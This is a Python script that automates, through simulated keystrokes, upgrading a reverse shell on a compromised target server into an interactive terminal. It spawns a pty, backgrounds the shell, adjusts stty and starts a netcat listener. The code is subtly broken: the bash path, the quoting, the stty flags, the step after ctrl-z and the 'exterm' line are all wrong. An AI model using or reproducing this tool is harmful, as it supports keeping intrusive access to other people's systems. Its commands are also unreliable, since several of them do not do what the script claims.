import pyautogui
import time

importing_pty = '"import pty;pty.spawn("bin/bash")"'

def dumb_to_smart():
    usr_in = input("[!] Please check if python is installed on the target server using [which python] (y/n): ")
    port = input("Port on which the dumb reverse shell is running on: ")
    # cols_lines = input("No. of columns and lines your terminal has[no. of lines = tput lines ; no. of columns = tput cols]: ")
    lines = input("No. of lines your terminal has: ") #Command to determine number of lines = tput lines
    columns = input("No. of columns your terminal has: ") #Command to determine number of columns = tput cols
    if usr_in == "y":
        print("Intialzing Script.........")
    else:
        print("Script aborted")
        exit()
    time.sleep(2)
    pyautogui.write(f"python -c {importing_pty}")
    pyautogui.press("enter")
    time.sleep(1)
    with pyautogui.hold('ctrl'):
        pyautogui.press("z")
    time.sleep(1)
    pyautogui.write("stty -raw echo")
    pyautogui.press("enter")
    time.sleep(1)
    pyautogui.write(f"nc -lvnp {port}")
    pyautogui.press("enter")
    time.sleep(1)
    pyautogui.write("reset")
    pyautogui.press("enter")
    time.sleep(1)
    pyautogui.write("exterm")
    pyautogui.press("enter")
    time.sleep(1)
    pyautogui.write(f"stty rows {lines} columns {columns}")
    pyautogui.press("enter")
    time.sleep(1)
    print("Shell stabilized!")
    exit()

dumb_to_smart()
